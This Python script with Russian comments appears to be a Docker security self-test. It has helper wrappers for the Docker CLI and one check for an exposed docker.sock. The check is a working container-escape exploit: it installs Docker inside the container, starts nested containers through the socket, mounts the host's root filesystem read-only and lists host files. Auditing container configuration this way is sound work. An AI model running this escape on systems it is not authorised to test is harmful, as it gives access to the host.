import subprocess


#########################################
#########################################
#########################################
#########################################
#Help_funcions


#показывает образы всех существующих контейнеров
def images_of_exists_conts():
        proc = subprocess.Popen(['docker' ,'ps', '-a'], stdout=subprocess.PIPE)
        docker_ps = proc.stdout.read()
        docker_ps = str(docker_ps)
        ids = []
        for i in range(len(docker_ps)-1):
            if docker_ps[i] == '\\' and docker_ps[i+1] == 'n':
                tmp_im = ''
                g = i+2
                if docker_ps[g] == '\'':
                    break
                while docker_ps[g] != ' ':
                    g+=1
                i = g

                mt = g + 3
                while docker_ps[mt] != ' ':
                    tmp_im += docker_ps[mt]
                    mt +=1
                ids.append(tmp_im)
        return(ids)


#показывает все существующие образы
def docker_images():
    proc = subprocess.Popen(['docker' ,'images'], stdout=subprocess.PIPE)
    images = proc.stdout.read()
    images = str(images)
    ids = []
    for i in range(len(images)-1):
        if images[i] == '\\' and images[i+1] == 'n':
            tmp = ''
            g = i+2
            if images[g] == '\'':
                break
            while images[g] != ' ':
                tmp += images[g]
                g+=1
            i = g
            ids.append(tmp)
    return ids


#показывает все существующие контейнеры
def docker_ps_a():
    proc = subprocess.Popen(['docker' ,'ps' ,'-a'], stdout=subprocess.PIPE)
    docker_ps = proc.stdout.read()
    docker_ps = str(docker_ps)
    ids = []
    for i in range(len(docker_ps)-1):
        if docker_ps[i] == '\\' and docker_ps[i+1] == 'n':
            tmp = ''
            g = i+2
            if docker_ps[g] == '\'':
                break
            while docker_ps[g] != ' ':
                tmp += docker_ps[g]
                g+=1
            i = g
            ids.append(tmp)
    return ids


#показывает запущенные контейнеры
def docker_ps():
        proc = subprocess.Popen(['docker' ,'ps'], stdout=subprocess.PIPE)
        docker_ps = proc.stdout.read()
        docker_ps = str(docker_ps)
        ids = []
        for i in range(len(docker_ps)-1):
            if docker_ps[i] == '\\' and docker_ps[i+1] == 'n':
                tmp = ''
                g = i+2
                if docker_ps[g] == '\'':
                    break
                while docker_ps[g] != ' ':
                    tmp += docker_ps[g]
                    g+=1
                i = g
                ids.append(tmp)
        return(ids)


#удаляет контейнер
def drm(idr):
    idr = str(idr)
    res = subprocess.call(['docker' ,'rm', idr])
    print('%s removed' %(idr))


#запускает контейнер
def dstart(idr):
    idr = str(idr)
    res = subprocess.call(['docker' ,'start', idr])
    print('%s Started' %(idr))


#зыкрывает контейнер
def dstop(idr):
    idr = str(idr)
    res = subprocess.call(['docker' ,'stop', idr])
    print('%s Stoped' %(idr))


#выполняет команду докер и возвращает результат команды
def com_with_return(comm):
    outp = ['docker']
    comm = str(comm)
    spl = comm.split()
    for i in spl:
        outp.append(i)
    proc = subprocess.Popen(outp, stdout=subprocess.PIPE)
    res = proc.stdout.read()
    res = str(res)
    return res


#выполняет команду докер и ничего не возвращает
def docker_com(comm):
    outp = ['docker']
    comm = str(comm)
    spl = comm.split()
    for i in spl:
        outp.append(i)
    result = subprocess.call(outp)


#выполняет команду докер и возвращает результат исполнения команды
def docker_com_with_return(comm):
    outp = ['docker']
    comm = str(comm)
    spl = comm.split()
    for i in spl:
        outp.append(i)
    proc = subprocess.Popen(outp, stdout=subprocess.PIPE)
    res = proc.stdout.read()
    res = str(res)
    return res


#ищет в докере то что надо (нужен тк странно работают ковычки в docker_com)
def docker_find(idr, obj):
    proc = subprocess.Popen(['docker', 'exec', str(idr), 'find', '/', '-name', obj], stdout=subprocess.PIPE)
    res = proc.stdout.read()
    res = str(res)
    return res


#########################################
#########################################
#########################################
#########################################
#EXPLOITS


def socket_exploit(idr, cont_number):

    rem = 1
    im = docker_images()
    for i in im:
        if i == 'alpine':
            rem = 0
            break
        else:
            rem = 1

    im_conts = images_of_exists_conts()
    im_cont_now = im_conts[cont_number]
    print('\n',im_cont_now,'\n')

    dstart(idr)
    if docker_find(idr, 'docker.sock') != 'b\'\'':
        docker_com('exec %s mkdir dockersock' %(idr))
        #docker_com('exec %s cd dockersock' %(idr))
        #тут было обновнение apt
        #docker_com('exec %s curl -sSL https://get.docker.com/' %(idr))

        if im_cont_now == 'debian' or im_cont_now == 'ubuntu':
            docker_com('exec %s apt update' %(idr))
            docker_com('exec %s apt install -y docker.io ' %(idr))
            print('installing docker.io')
        elif im_cont_now == 'alpine':
            docker_com('exec %s apk update')
            docker_com('exec %s apk add -U docker' %(idr))
            print('installing docker on alpine')
        else:
            docker_com('exec %s apt update' %(idr))
            docker_com('exec %s apt install -y docker.io' %(idr))
            print('installing docker.io')

        try:
            docker_com('exec %s docker run -itd -v /var/run/docker.sock:/var/run/docker.sock alpine' %(idr))
        except:
            print('\n')
            print('YOU PASS BUT THERE IS VULNERABILITY')
            print('###################################')
            print('\n')
            return None

        idr2 = docker_ps()
        idr2 = idr2[0]

        docker_com('exec %s docker start %s' %(idr, idr2))
        docker_com('exec %s docker exec %s apk update' %(idr, idr2))
        docker_com('exec %s docker exec %s apk add -U docker' %(idr, idr2))
        docker_com('exec %s docker exec %s docker -H unix:///var/run/docker.sock run -id -v /:/test:ro alpine' %(idr, idr2))

        idr3 = docker_ps()
        idr3 = idr3[0]
        res = ''
        try:
            print(docker_com_with_return('exec %s docker exec %s docker exec %s ls' %(idr, idr2, idr3)))
            res_ls = (docker_com_with_return('exec %s docker exec %s docker exec %s ls' %(idr, idr2, idr3)))
            if 'test' in res_ls:
                print(docker_com_with_return('exec %s docker exec %s docker exec %s ls test' %(idr, idr2, idr3)))
                print(docker_com_with_return('exec %s docker exec %s docker exec %s ls test/etc' %(idr, idr2, idr3)))
                res = 'pau pau'
        except:
            print('%s DIDN\'T PASS SOCKET_TEST_WITH_EXEC_ON_HOST_but_something_went_wrong!!!' %(idr))
            dstop(idr2)
            dstop(idr3)
            if idr != idr2:
                drm(idr2)
            if idr != idr3:
                drm(idr3)
            return None


        if res != 'b\'\'':
            print('\n')
            print(res)
            print('%s DIDN\'T PASS SOCKET_TEST_WITH_EXEC_ON_HOST!!!' %(idr))
            print('##########################################################')
            print('\n')
        else:
            print('\n')
            print('YOU PASS BUT THERE IS VULNERABILITY')
            print('###################################')
            print('\n')

        if idr != idr2:
            dstop(idr2)
            drm(idr2)
        if idr != idr3:
            dstop(idr3)
            drm(idr3)

        if rem == 1:
            docker_com('rmi alpine')

        if im_cont_now == 'alpine':
            docker_com('exec %s apk del docker' %(idr))
        else:
            docker_com('exec %s apt remove -y docker.io' %(idr))

        docker_com('exec %s rmdir dockersock' %(idr))

    else:
        print('\n')
        print('PASS')
        print('####')
        print('\n')

    inp = input('Do you want to stop %s container(Y/n):' %(idr))
    if inp  == 'Y' or inp == 'y' or inp == 'Yes' or inp == 'yes':
        dstop(idr)



#EXPLOITS
#########################################
#########################################
#########################################
#########################################




#########################################
#########################################
#########################################
#########################################
#MAIN
if __name__ == "__main__":
    def ls_ex():
        print('1.SOCKET_TEST_WITH_EXEC_ON_HOST')


    #m = subprocess.call(['sudo','touch', '/tmp/12345'])


    print('\n')
    ls_ex()
    print('\n')
    print(*docker_ps_a())
    print('\n')


    idr = input('Enter_conteiner_ids_number->')
    print('\n')
    num = input('Enter_number_of_exploit_in_list(ls_ex)->')
    print('\n')

    idr = idr.split()
    num = num.split()
    idr_real = docker_ps_a()

    for i in num:
        if i == '1':
            for g in idr:
                g = int(g)
                socket_exploit(idr_real[g-1], g-1)

    #m = subprocess.call(['sudo','rm', '/tmp/12345'])


########################################

#########################################
#########################################
#########################################
#########################################
#########################################
#########################################
#########################################
#########################################
